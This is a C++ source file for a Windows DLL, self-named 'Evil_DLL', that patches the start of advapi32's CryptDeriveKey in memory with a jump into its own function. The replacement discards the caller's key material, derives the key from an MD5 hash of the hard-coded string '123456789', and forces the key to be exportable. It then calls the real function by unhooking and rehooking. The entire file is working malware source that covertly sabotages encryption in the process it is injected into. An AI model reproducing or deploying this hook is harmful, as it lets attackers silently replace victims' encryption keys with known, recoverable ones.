// Evil_DLL.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include <tchar.h>
#include <windows.h>
#include "Wincrypt.h"
#include "Evil_DLL.h"

typedef BOOL (WINAPI *CRYPTDERIVEKEY)(HCRYPTPROV hProv, ALG_ID Algid,
				HCRYPTHASH hBaseData, DWORD dwFlags, HCRYPTKEY* phKey);

BOOL WINAPI MyCryptDeriveKey(HCRYPTPROV hProv, ALG_ID Algid,
							 HCRYPTHASH hBaseData, DWORD dwFlags, HCRYPTKEY* phKey);

void ObtainWriteAccessToAddress(LPVOID pAddress, DWORD dwSize);

char g_szOrigCode[12];

EVIL_DLL_API void InstallHooks()
{	
	// Set up jump instruction to our replacement function
	char szDetourCode[12] = {0xB8, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0, 0x90, 0x90, 0x00, 0x00, 0x00};

	// Initialize old code buffer to zero
	memset(g_szOrigCode, 0, 12);

	// Now we're going to overwrite the first 9 bytes of the victim function with a
	// jump to our own function.  So get pointer to function
	CRYPTDERIVEKEY pfnVictim = (CRYPTDERIVEKEY)GetProcAddress(GetModuleHandle("advapi32.dll"), "CryptDeriveKey");	

	// Stamp address into patch code
	DWORD dwAddr = (DWORD)*(&MyCryptDeriveKey);

	// Save original code bytes from CryptDeriveKey()
	memcpy(g_szOrigCode, pfnVictim, 12);

	memcpy(szDetourCode+1, &dwAddr, 4);	
	// Need to gain write access to the code memory we want to change
	ObtainWriteAccessToAddress((PVOID)pfnVictim, 12);

	// Copy the jump over the beginning of the function.
	memcpy((PVOID)pfnVictim, szDetourCode, 12);
}

EVIL_DLL_API void UninstallHooks()
{
	// Now we're going to overwrite the first 9 bytes of the victim function with a
	// jump to our own function.  So get pointer to function
	CRYPTDERIVEKEY pfnVictim = (CRYPTDERIVEKEY)GetProcAddress(GetModuleHandle("advapi32.dll"), "CryptDeriveKey");	
	
	// Need to gain write access to the code memory we want to change
	ObtainWriteAccessToAddress((PVOID)pfnVictim, 12);

	// Copy the jump over the beginning of the function.
	memcpy((PVOID)pfnVictim, g_szOrigCode, 12);
}

BOOL WINAPI MyCryptDeriveKey(HCRYPTPROV hCryptProv, ALG_ID Algid,
							 HCRYPTHASH hBaseData, DWORD dwFlags, HCRYPTKEY* phKey)
{
	BOOL bRet = TRUE;
	HCRYPTHASH hHash = NULL;

	MessageBox(HWND_DESKTOP, "my derive key", "hello", MB_OK);		

	while(1)
	{
		if(!CryptCreateHash(hCryptProv, 
							   CALG_MD5, 
							   0, 
							   0, 
							   &hHash))
		{
			break;
		}

		if(!CryptHashData(hHash, 
						 (BYTE *)"123456789", 
						 9, 
						 0))
		{
			break;
		}

		UninstallHooks();

		CryptDeriveKey(hCryptProv, 
					   Algid, 
					   hHash, 
					   CRYPT_EXPORTABLE, 
					   phKey) ;
		
		InstallHooks();

		bRet = TRUE;
		break;
	}

	// We're done with the keys.  Release the context
	if(hHash)
	{
		CryptDestroyHash(hHash);
	}

	return bRet;
}

void ObtainWriteAccessToAddress(LPVOID pAddress, DWORD dwSize)
{
	MEMORY_BASIC_INFORMATION meminfo;

	DWORD dwOldProt;

	VirtualProtect(pAddress, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProt);
}